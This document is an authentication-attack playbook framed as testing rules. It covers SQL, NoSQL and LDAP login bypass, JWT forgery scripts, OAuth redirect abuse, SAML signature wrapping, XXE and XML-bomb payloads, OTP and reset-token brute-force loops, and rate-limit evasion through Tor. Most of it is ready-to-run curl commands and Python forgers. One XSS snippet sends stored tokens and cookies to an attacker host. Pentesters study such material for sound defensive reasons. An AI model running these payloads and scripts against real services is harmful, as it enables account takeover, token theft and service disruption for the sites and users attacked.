# Authentication Testing Rules

> Comprehensive guide for testing authentication mechanisms across web applications and APIs.
> Covers: login bypass, JWT, OAuth 2.0/OIDC, SAML, MFA bypass, password reset, session management, rate limiting.

---

## 1. Login Bypass Testing

### 1.1 SQL Injection Login Bypass

**Payloads:**
```
' OR '1'='1' --
' OR 1=1 --
admin' --
' UNION SELECT 1,'admin','bypass'--
" OR 1=1 --
```

```
curl -X POST "https://target.com/login" -d "username=admin'+OR+'1'%3D'1'--&password=x"
curl -X POST "https://target.com/api/login" -H "Content-Type: application/json" -d '{"username": "admin'"'"' OR '"'"'1'"'"'='"'"'1", "password": "x"}'
```

**Blind:**
```
admin' AND 1=1-- / admin' AND 1=2--     (boolean)
admin' OR IF(1=1,SLEEP(5),0)--           (time-based)
```

---

### 1.2 NoSQL Injection Login Bypass

**JSON endpoints:**
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$or": [{"username": "admin"}, {"username": {"$exists": false}}], "password": {"$ne": ""}}
```

**URL-encoded:**
```
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

```
curl -X POST "https://target.com/api/login" -H "Content-Type: application/json" -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
curl -X POST "https://target.com/login" -d "username[$ne]=nonexistent&password[$ne]=test"
```

---

### 1.3 Parameter Pollution Login Bypass

Different frameworks handle duplicate params differently: PHP (last wins), ASP.NET (concat), Node.js/qs (array), Java (first wins).

```
curl -X POST "https://target.com/login" -d "username=invalid&username=admin&password=x"
curl -X POST "https://target.com/login" -d "username[]=admin&password=x"
curl -X POST "https://target.com/login" -d "' OR 1=1--&username=admin&password=x"
```

---

### 1.4 Mass Assignment / Type Confusion

```
curl -X POST "https://target.com/api/register" -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"P@ss1234","is_admin":true}'
curl -X POST "https://target.com/api/register" -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"P@ss1234","role":"admin"}'
curl -X POST "https://target.com/api/register" -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"P@ss1234","verified":true,"email_verified":true}'
```

Common fields: `is_admin`, `role`, `role_id`, `verified`, `email_verified`, `credit`, `balance`, `permissions`, `scope`, `tier`, `plan`.

---

### 1.5 LDAP Injection Login Bypass

```
*)(uid=*))(|(uid=*
*)(|(password=*)
admin)(|(password=*
```

```
curl -X POST "https://target.com/login" -d "username=*)(uid=*))(|(uid=*&password=x"
```

---

### 1.6 XPath Injection Login Bypass

```
' or '1'='1
' or true() or '
```

---

### 1.7 HTTP Verb Tampering

```
curl -X GET "https://target.com/admin/delete-user?user_id=123"
curl -X PUT "https://target.com/admin/users" -H "Content-Type: application/json" -d '{"username":"newadmin","role":"admin"}'
curl -X PATCH "https://target.com/api/user/profile" -H "Content-Type: application/json" -d '{"role":"admin"}'
```

---

### 1.8 Default Credentials and Enumeration

```
curl -X POST "https://target.com/login" -d "username=admin&password=admin"
curl -X POST "https://target.com/login" -d "username=root&password=root"

# User enumeration check
curl -X POST "https://target.com/login" -d "username=existing_user&password=wrong"   # "Invalid password"
curl -X POST "https://target.com/login" -d "username=nonexistent&password=wrong"     # "User not found"
```

---

## 2. JWT Attacks

### 2.1 alg:none Attack

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.
```

```
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ."
curl -X GET "https://target.com/api/admin" -H "Authorization: Bearer $TOKEN"
```

Variations: `alg: NONE`, `None`, `nOnE` (uppercased/mixed).

---

### 2.2 Weak HMAC Secret Brute Force

```
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 -a 0 <token> /usr/share/wordlists/rockyou.txt
```

Common weak secrets: `secret`, `jwt`, `password`, `admin`, `key`, `s3cr3t`, `changeme`, `development`.

```
python3 -c "import jwt; print(jwt.encode({'sub':'admin','admin':True}, 'secret', algorithm='HS256'))"
```

---

### 2.3 Kid Header Injection

Path traversal: `kid: ../../dev/null` → HMAC key is "" (empty). SQLi: `kid: ' UNION SELECT 'known_secret' --`.

```python
import base64, json, hmac, hashlib
h = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","kid":"../../dev/null"}).encode()).decode().rstrip("=")
p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","admin":True}).encode()).decode().rstrip("=")
s = base64.urlsafe_b64encode(hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()).decode().rstrip("=")
print(f"{h}.{p}.{s}")
```

---

### 2.4 JWK Header Injection

Generate your own RSA keypair, embed the public key in `jwk` header, sign with private key.

```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding, utils
import base64, json

k = rsa.generate_private_key(65537, 2048)
pub = k.public_key()
n = base64.urlsafe_b64encode(pub.public_numbers().n.to_bytes(256, 'big')).decode().rstrip("=")
e = base64.urlsafe_b64encode(pub.public_numbers().e.to_bytes(3, 'big')).decode().rstrip("=")
jwk = {"kty":"RSA","n":n,"e":e,"alg":"RS256"}
h = base64.urlsafe_b64encode(json.dumps({"alg":"RS256","jwk":jwk}).encode()).decode().rstrip("=")
p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","admin":True}).encode()).decode().rstrip("=")
sig = base64.urlsafe_b64encode(k.sign(f"{h}.{p}".encode(), padding.PKCS1v15(), utils.Prehashed(hashes.SHA256()))).decode().rstrip("=")
print(f"{h}.{p}.{sig}")
```

---

### 2.5 RS256 to HS256 Algorithm Confusion

If public key is obtainable (`/.well-known/jwks.json`), forge tokens using public key as HMAC secret.

```
curl -s "https://target.com/.well-known/jwks.json"
```

```python
import jwt
forged = jwt.encode({"sub":"admin","admin":True}, "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----", algorithm="HS256")
print(forged)
```

---

### 2.6 Claims Manipulation

| Claim | Attack | Impact |
|-------|--------|--------|
| `sub` | Change to another user ID | Impersonation |
| `admin`/`is_admin` | Set to true | Priv esc |
| `role` | Change to admin/root | Priv esc |
| `exp` | Set to far future | Token never expires |
| `scope` | Add admin scopes | Priv esc |
| `iat`/`nbf` | Move to future/past | Token reuse |

```
curl -X GET "https://target.com/api/admin/users" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ."
```

---

### 2.7 JWT Expiration Bypass

Modify `exp` to `9999999999` (year 2286).

```
curl -X GET "https://target.com/api/account" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.signature"
```

---

### 2.8 JWT Injection via Sub/ISS

If `sub`/`iss` is used in queries, test SQLi/NoSQLi/template injection.

```
curl -X POST "https://target.com/api/register" -H "Content-Type: application/json" -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- @test.com","password":"x"}'
```

---

### 2.9 Token Sidejacking via XSS

If JWT is in localStorage/sessionStorage, XSS can steal it.

```javascript
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
fetch('https://attacker.com/steal?token=' + document.cookie)
```

```
curl -X GET "https://target.com/api/account" -H "Authorization: Bearer <stolen_jwt>"
```

---

### 2.10 JKU Header Injection

Host a JWKS on attacker.com, point `jku` header to it, sign with matching private key.

```python
import base64, json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding, utils

k = rsa.generate_private_key(65537, 2048)
pub = k.public_key()
n = base64.urlsafe_b64encode(pub.public_numbers().n.to_bytes(256, 'big')).decode().rstrip("=")
e = base64.urlsafe_b64encode(pub.public_numbers().e.to_bytes(3, 'big')).decode().rstrip("=")
h = base64.urlsafe_b64encode(json.dumps({"alg":"RS256","kid":"attacker-key","jku":"https://attacker.com/jwks.json"}).encode()).decode().rstrip("=")
p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","admin":True}).encode()).decode().rstrip("=")
sig = base64.urlsafe_b64encode(k.sign(f"{h}.{p}".encode(), padding.PKCS1v15(), utils.Prehashed(hashes.SHA256()))).decode().rstrip("=")
print(f"{h}.{p}.{sig}")
```

---

## 3. OAuth 2.0 / OIDC Testing

### 3.1 Redirect URI Bypass

Test variations:
```
https://target.com/callback.evil.com      (subdomain trick)
https://target.com/callback@evil.com      (credential-style URL)
https://target.com.evil.com/callback      (domain confusion)
https://target.com/callback%00.evil.com   (null byte)
https://evil.com/target.com/callback      (path traversal)
http://target.com/callback               (http instead of https)
```

```
curl -X GET "https://target.com/oauth/authorize?response_type=code&client_id=app1&redirect_uri=https://evil.com/callback&state=xyz" -L -v
```

---

### 3.2 CSRF on OAuth Link (State Parameter)

Check if `state` is missing, predictable (timestamp, sequential), or reusable.

```
curl -X GET "https://target.com/oauth/authorize?response_type=code&client_id=abc123&redirect_uri=https://target.com/callback"
```

```html
<img src="https://target.com/oauth/authorize?response_type=code&client_id=victim_client&redirect_uri=https://target.com/callback&state=12345" style="display:none"/>
```

---

### 3.3 Authorization Code Interception

Check if code is in query string vs fragment, leaks via referer, predictable.

```
CODE1=$(curl -s "https://target.com/oauth/authorize?response_type=code&client_id=abc" | grep -oP 'code=\K[^&]+')
CODE2=$(curl -s "https://target.com/oauth/authorize?response_type=code&client_id=abc" | grep -oP 'code=\K[^&]+')
```

---

### 3.4 Token Theft via Referer Header

```
curl -s -I "https://target.com/callback" | findstr /i "referrer-policy"
# Expected: Referrer-Policy: no-referrer
```

---

### 3.5 Client Secret Leak / Scope Escalation

Search APK, JS bundles, public repos for `client_secret`. Use with `client_credentials` grant.

```
curl -X POST "https://auth.target.com/oauth/token" -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&scope=admin"
```

---

### 3.6 PKCE Downgrade Attack

```
# Normal:    GET /authorize?...&code_challenge=E9Melhoa2Ow&code_challenge_method=S256
# Downgrade: GET /authorize?...                  (no code_challenge)
# Downgrade: GET /authorize?...&code_challenge=E9Melhoa2Ow  (no method)
# Downgrade: GET /authorize?...&code_challenge=guessable&code_challenge_method=plain
```

---

### 3.7 Open Redirect via OAuth Flow

Test parameters: `redirect_uri`, `redirect`, `next`, `url`, `return_to`, `callback`, `continue`, `RelayState`.

```
curl -X GET "https://target.com/oauth/authorize?client_id=app&redirect_uri=https://evil.com/phish"
curl -X GET "https://target.com/login?next=https://evil.com"
```

---

### 3.8 Covert Redirect via Fragment

```
https://target.com/callback#access_token=...&redirect_uri=https://evil.com
```

---

### 3.9 Implicit Grant Token Interception

Check for `response_type=token` (fragment-based token leak via referer/browser history).

```
GET /authorize?response_type=token&client_id=app&redirect_uri=https://target.com/callback
```

---

### 3.10 Refresh Token Reuse / Rotation Flaws

```
curl -X POST "https://auth.target.com/oauth/token" -d "grant_type=refresh_token&client_id=app&refresh_token=first_refresh"
# Reuse same token — if second call also works, rotation is not implemented
```

---

### 3.11 OAuth Account Linking CSRF

```
POST /oauth/connect
Cookie: session=victim
Content-Type: application/x-www-form-urlencoded

provider=google&external_id=attacker_google_id
```

---

## 4. SAML Attacks

### 4.1 XML Signature Wrapping (XSW1-XSW8)

| XSW | Technique |
|-----|-----------|
| XSW1 | Duplicate element after signed element — validates first, uses second |
| XSW2 | Modify ID reference — signature references original, parser reads modified |
| XSW3 | Wrap in wrapper element |
| XSW4 | XSLT transform modifies content after signature validation |
| XSW5 | XPath manipulation — validation XPath differs from processing XPath |
| XSW6 | Context manipulation |
| XSW7 | SOAP body manipulation |
| XSW8 | Multi-layer wrapping with namespace tricks |

**XSW1 payload:**
```xml
<saml:Response>
  <saml:Assertion ID="signed_assertion"><ds:Signature>...</ds:Signature>
    <saml:Subject><saml:NameID>victim@target.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="attacker_assertion">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>
```

```
SAML_RESPONSE=$(curl -s "https://target.com/saml/callback" -d "SAMLResponse=$(cat encoded_response)")
echo $SAML_RESPONSE | base64 -d > original.xml
# Modify XML, then:
cat modified.xml | base64 -w0 > encoded_payload
curl -X POST "https://target.com/saml/callback" -d "SAMLResponse=$(cat encoded_payload)"
```

---

### 4.2 Comment Injection in NameID

```xml
<saml:NameID>admin@target.com<!--evil-->@attacker.com</saml:NameID>
<saml:NameID>user<!--admin-->@target.com</saml:NameID>
```

Different parsers handle comments differently (strip, include, compare outer text).

---

### 4.3 Signature Stripping

Remove `<ds:Signature>` element entirely. Modify assertion content.

```xml
<saml:Response>
  <saml:Assertion ID="id123">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>
```

---

### 4.4 IdP Confusion / Key Confusion

If SP accepts assertions signed by any key or any IdP, forge with attacker's key.

```
curl -s "https://target.com/SAML2/Metadata"
```

---

### 4.5 Replay Attack

```
curl -X POST "https://target.com/saml/callback" -d "SAMLResponse=$(captured_encoded_response)"
# Second submission with same assertion — if accepted, replayable
```

---

### 4.6 Audience Restriction Bypass

```xml
<saml:Conditions>
  <saml:AudienceRestriction>
    <saml:Audience>https://target.com/sp</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>
<!-- Test with wrong/no audience -->
```

---

### 4.7 XML External Entity (XXE) in SAML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Response><saml:Assertion><saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject></saml:Assertion></saml:Response>
```

---

### 4.8 XML Bombs (Billion Laughs) in SAML

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]>
<saml:Response>&lol4;</saml:Response>
```

---

## 5. MFA / 2FA Bypass (7 Patterns)

### 5.1 Pattern 1: MFA Not Enforced on Sensitive Endpoints

```
curl -X POST "https://target.com/login" -d "username=user1&password=pass1&otp=123456" -c cookies.txt
curl -X POST "https://target.com/account/password/change" -b cookies.txt -d "new_password=NewP@ss123"
curl -X POST "https://target.com/account/email/change" -b cookies.txt -d "new_email=attacker@evil.com"
```

---

### 5.2 Pattern 2: MFA Step Skip via Direct Navigation

```
curl -X POST "https://target.com/login" -d "username=user1&password=pass1" -c cookies.txt -L --max-redirs 0
curl -X GET "https://target.com/dashboard" -b cookies.txt
```

MFA state machine bypass — partial session grants access to post-login pages.

---

### 5.3 Pattern 3: MFA Token Replay

```
curl -X POST "https://target.com/mfa/verify" -b "session=token123" -d "code=123456"
curl -X POST "https://target.com/mfa/verify" -b "session=token456" -d "code=123456"
```

Same OTP accepted for different sessions = replay.

---

### 5.4 Pattern 4: Brute-Force OTP

```
for i in $(seq -w 000000 000010); do
  curl -s -X POST "https://target.com/mfa/verify" -b "session=session123" -d "code=$i" -w "\n%{http_code}" | tail -1
done
```

If no 429/423 after 10+ attempts, OTP is bruteforceable (1M possibilities).

---

### 5.5 Pattern 5: Race Condition on OTP Validation

```
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/mfa/verify" -b "session=sess$i" -d "code=123456" &
done
wait
```

TOCTOU — multiple concurrent requests with same OTP may all pass.

---

### 5.6 Pattern 6: Recovery Code Dump via API

```
curl -X GET "https://target.com/api/me" -H "Authorization: Bearer token123"
curl -X GET "https://target.com/api/account/mfa" -H "Authorization: Bearer token123"
```

Check for `recovery_codes` field in responses. IDOR variation: `/api/admin/user/124/recovery-codes`.

---

### 5.7 Pattern 7: Backup Factor Downgrade

```
curl -X POST "https://target.com/mfa/challenge" -b "session=abc123" -d "factor=sms"
curl -X POST "https://target.com/login" -d "username=victim&password=pass&factor=sms"
```

Switch from TOTP to weaker factor (SMS, email).

---

## 6. Password Reset Flaws

### 6.1 Host Header Injection in Reset Link

```
curl -X POST "https://target.com/password/reset" -H "Host: evil.com" -d "email=victim@target.com"
curl -X POST "https://target.com/password/reset" -H "X-Forwarded-Host: evil.com" -d "email=victim@target.com"
```

Victim receives reset link pointing to `evil.com` — attacker captures token.

---

### 6.2 Predictable Reset Token

```
curl -s -X POST "https://target.com/password/reset" -H "Content-Type: application/json" -d '{"email":"victim@target.com"}'
sleep 1
curl -s -X POST "https://target.com/password/reset" -H "Content-Type: application/json" -d '{"email":"victim@target.com"}'
```

Check for timestamps, sequential IDs, base64 encoded values, UUID v1.

```
for i in $(seq -w 000000 999999); do
  response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/password/reset/confirm" -d "token=$i&new_password=NewP@ss123")
  if [ "$response" != "401" ] && [ "$response" != "400" ]; then echo "Valid token: $i (HTTP $response)"; break; fi
done
```

---

### 6.3 Token Leak in Referer Header

```
curl -s -I "https://target.com/reset" | findstr /i "referrer"
# Expected: Referrer-Policy: no-referrer
```

Reset page loading external resources leaks token via Referer.

---

### 6.4 Race Condition on Reset Link

```
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/password/reset/confirm" -d "token=abc123&new_password=NewP@ss$i" &
done
wait
```

Same token used concurrently from multiple sessions.

---

### 6.5 Token Not Invalidated After Use

```
curl -X POST "https://target.com/password/reset/confirm" -d "token=abc123&new_password=Password1"
curl -X POST "https://target.com/password/reset/confirm" -d "token=abc123&new_password=Password2"
```

Same token works twice → not invalidated after use.

---

### 6.6 User Enumeration via Reset Endpoint

```
curl -s -X POST "https://target.com/password/reset" -d "email=existing@target.com" -w "\nTime: %{time_total}\n"
curl -s -X POST "https://target.com/password/reset" -d "email=nonexistent@target.com" -w "\nTime: %{time_total}\n"
```

Compare status codes, response bodies, timing.

---

### 6.7 Password Reset Poisoning via Email

```
curl -X POST "https://target.com/password/reset" -d "email=attacker@evil.com"
curl -X POST "https://target.com/password/reset/confirm" -d "email=victim@target.com&token=attacker_token&new_password=hacked"
```

Token not bound to user account — attacker's token used to reset victim's password.

---

## 7. Session Testing

### 7.1 Session Fixation

```
curl -s -I "https://target.com/" | findstr /i "Set-Cookie"
curl -X POST "https://target.com/login" -b "session=abc123" -d "username=victim&password=pass123"
curl -X GET "https://target.com/account" -b "session=abc123"
```

Check if session ID remains the same before/after login. Test URL-based: `https://target.com/login;jsessionid=abc123`.

---

### 7.2 Session Prediction

```
for i in $(seq 1 10); do
  curl -s -I "https://target.com/" | findstr /i "Set-Cookie"
  sleep 0.1
done
```

Look for sequential integers, timestamps, weak hashes.

```
for i in $(seq 1000 9999); do
  response=$(curl -s -o /dev/null -w "%{http_code}" -X GET "https://target.com/account" -b "session=$i")
  if [ "$response" != "302" ] && [ "$response" != "401" ]; then echo "Valid session: $i"; fi
done
```

---

### 7.3 Concurrent Session Flaws

```
curl -X POST "https://target.com/login" -d "username=victim&password=pass" -c cookies1.txt
curl -X POST "https://target.com/login" -d "username=victim&password=pass" -c cookies2.txt
curl -X GET "https://target.com/account" -b cookies1.txt
curl -X GET "https://target.com/account" -b cookies2.txt
```

Both sessions work = no concurrent session limit. Check password change invalidates other sessions.

---

### 7.4 Session Invalidation on Logout

```
curl -X POST "https://target.com/login" -d "username=victim&password=pass" -c cookies.txt
curl -X POST "https://target.com/logout" -b cookies.txt
curl -X GET "https://target.com/account" -b cookies.txt
```

If still accessible, session not destroyed server-side.

---

### 7.5 Session Timeout Misconfiguration

```
curl -s -I -X POST "https://target.com/login" -d "username=victim&password=pass" | findstr /i "Set-Cookie"
```

Check `Max-Age`/`Expires`. Test idle timeout by waiting then reusing session.

---

### 7.6 Weak Session Cookie Attributes

```
curl -s -I -v -X POST "https://target.com/login" -d "username=victim&password=pass" 2>&1 | findstr /i "Set-Cookie"
```

| Missing Attribute | Risk |
|-------------------|------|
| No HttpOnly | XSS steals via document.cookie |
| No Secure | Sent over HTTP (MITM) |
| No SameSite | Vulnerable to CSRF |
| No Path restriction | Sent to unintended paths |

---

### 7.7 Session Token in URL

```
curl -v -X POST "https://target.com/login" -d "username=victim&password=pass" 2>&1 | findstr /i "location"
```

Check for `Location: /dashboard?token=eyJ...` — tokens in URLs leak via referer, logs, browser history.

---

## 8. Rate Limit Testing on Auth Endpoints

### 8.1 Login Rate Limiting Bypass

```
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://target.com/login" -d "username=victim&password=wrong$i"
done
```

**X-Forwarded-For bypass:**
```
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://target.com/login" -H "X-Forwarded-For: 10.0.0.$i" -d "username=admin&password=wrong"
done
```

**Alternative headers:** `X-Real-IP`, `X-Client-IP`, `CF-Connecting-IP`, `True-Client-IP`.

**Endpoint rotation:** `/login`, `/api/login`, `/v1/login`, `/auth`, `/signin`, `/authenticate`.

**Content-Type rotation:** JSON, XML, form-urlencoded.

**HTTP verb bypass:** `GET /login?username=admin&password=guess`, `HEAD`, `OPTIONS`.

---

### 8.2 OTP / Lockout Rate Limiting Bypass

```
for i in $(seq -w 000000 000050); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://target.com/mfa/verify" -b "session=partial_session" -d "code=$i"
done
```

**OTP resend bypass:** `/mfa/send?method=sms`, `/mfa/send?method=email`, `/mfa/resend`.

---

### 8.3 Password Reset Rate Limiting Bypass

```
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://target.com/password/reset" -d "email=victim@target.com"
done
```

**Token verification rate limit test:**
```
for i in $(seq 1 10000); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/password/reset/confirm" -d "token=$i&new_password=Test123!")
  if [ "$RESPONSE" != "429" ] && [ "$RESPONSE" != "401" ] && [ "$RESPONSE" != "400" ]; then echo "Valid token: $i (HTTP $RESPONSE)"; fi
done
```

---

### 8.4 IP Rotation / Distributed Bypass

```
for i in $(seq 1 10); do
  echo -e "AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\n" | nc -w 1 127.0.0.1 9051
  torsocks curl -s -o /dev/null -w "%{http_code} " -X POST "https://target.com/login" -d "username=admin&password=guess"
done
```

Use proxy lists, VPN rotation, IPv6 rotation, cloud functions.

---

### 8.5 Header-Based Rate Limit Bypass

```
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://target.com/login" -H "User-Agent: Mozilla/5.0 (Bot$i)" -d "username=admin&password=guess"
done
```

Rate limit keyed on `User-Agent`, `Accept-Language` — trivially bypassed.

---

### 8.6 Rate Limit Scoping Flaws

Map all auth endpoints and test each for missing rate limiting.

```
endpoints=("login" "api/login" "auth" "signin" "token" "oauth/token" "mfa/verify" "password/reset")
for endpoint in "${endpoints[@]}"; do
  for i in $(seq 1 5); do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$endpoint" -d "username=admin&password=guess")
    if [ "$code" != "429" ]; then echo "$endpoint: HTTP $code (no rate limit?)"; break; fi
  done
done
```

---

## 9. Tooling and Automation

### JWT Tools
```
python3 jwt_tool.py <token> -T       # Tamper claims
python3 jwt_tool.py <token> -X a     # alg:none
python3 jwt_tool.py <token> -X k     # kid injection
python3 jwt_tool.py <token> -X i     # JWK injection
python3 jwt_tool.py <token> -X j     # JKU injection
python3 jwt_tool.py <token> -C -d wordlist.txt  # Crack HMAC
jwt-cracker <token> <wordlist>
```

### SAML Tools
```
# SAML Raider (Burp Suite Extension) — intercept, modify, XSW1-XSW8, signature strip
python samlmagic.py -i saml_response.xml -a admin -r admin
```

### Rate Limiting Tools
```
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=guess" -H "X-Forwarded-For: FUZZ" -u https://target.com/login -mode clusterbomb
```

### General Testing Script

```python
import requests, base64, json, sys
BASE = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

def test_login_bypass():
    for p in ["' OR '1'='1' --", "' OR 1=1 --", '{"$gt": ""}', '{"$ne": ""}']:
        r = requests.post(f"{BASE}/login", data={"username": p, "password": "x"})
        if r.status_code == 302 or "dashboard" in r.text.lower(): print(f"Login bypass with: {p}")

def test_jwt_none():
    h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
    p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","admin":True}).encode()).rstrip(b"=")
    r = requests.get(f"{BASE}/api/admin", headers={"Authorization": f"Bearer {h.decode()}.{p.decode()}."})
    if r.status_code == 200: print("JWT alg:none works!")

def test_mfa_skip():
    s = requests.Session()
    s.post(f"{BASE}/login", data={"username": "test", "password": "test"})
    r = s.get(f"{BASE}/dashboard")
    if r.status_code == 200: print("MFA step-skip possible!")

def test_session_fixation():
    r = requests.get(BASE)
    s = requests.Session(); s.cookies.set("session", r.cookies.get("session"))
    s.post(f"{BASE}/login", data={"username": "test", "password": "test"})
    if s.get(f"{BASE}/account").status_code == 200: print(f"Session fixation possible!")

test_login_bypass(); test_jwt_none(); test_mfa_skip(); test_session_fixation()
```

---

## 10. Cheat Sheet: Quick Reference

### Login Bypass
```
SQLi:       ' OR '1'='1' --         (" OR 1=1 --)
NoSQLi:     {"$gt": ""}             (username[$gt]=)
Pollution:  username=admin&username=wrong  (last wins?)
MassAssign: {"is_admin":true}       {"role":"admin"}
LDAP:       *)(uid=*))(|(uid=*      (*)(password=*)
Verb:       GET /admin?action=delete (instead of POST)
Defaults:   admin:admin             root:root
```

### JWT Attacks
```
alg:none:   eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
Weak HMAC:  hashcat -m 16500 token.txt rockyou.txt
Kid inj:    {"kid":"../../dev/null"}  (sign with "")
JWK inj:    Embed your own RSA key in header
RS->HS:      Use public key as HMAC secret
```

### OAuth 2.0
```
redirect_uri bypass:  https://target.com.evil.com/callback
State CSRF:           Pre-generate state, send to victim
Code intercept:       Check HTTP vs HTTPS, referer leakage
Client secret:        Check APK/JS bundle for client_secret
PKCE downgrade:       Remove code_challenge parameter
```

### SAML
```
XSW1:       Duplicate assertion after signed one
Comment:    user@target.com<!--evil-->@attacker.com
Strip:      Remove <ds:Signature> entirely
Replay:     Submit same SAMLResponse twice
IdP conf:   Register own IdP, sign assertion
```

### MFA Bypass
```
Not enforced:  Change password without MFA step-up
Step skip:     Navigate to /dashboard after password only
Replay:        Use same OTP code twice
Brute:         Loop through 000000-999999 OTPs (if no rate limit)
Race:          Send 20 concurrent OTP verifications
Recovery:      GET /api/me (check for recovery codes)
Downgrade:     Switch from TOTP to SMS
```

### Password Reset
```
Host inj:     Change Host header to evil.com
Predictable:  Token is timestamp/sequential/userhash
Referer leak: Reset page loads external resource
Race:         Concurrent reset with same token
Reuse:        Use same token after successful reset
Enumeration:  Check response for "user not found"
```

### Session
```
Fixation:     Pre-set session ID, victim logs in
Prediction:   Sequential/timestamp sessions
Concurrent:   No limit on active sessions
Logout:       Session still works after logout
Timeout:      No idle/absolute timeout
Cookie:       Missing HttpOnly, Secure, SameSite
URL token:    Token in GET parameter (?session=abc)
```

### Rate Limit
```
X-Forwarded-For:   Rotate IPs via header
Endpoint rotate:   /login, /api/login, /v1/login
Content type:      JSON, XML, form-urlencoded
User-Agent:        Rotate User-Agent per request
Distributed:       Multiple IPs via proxy list
```

---

*End of Authentication Testing Rules*
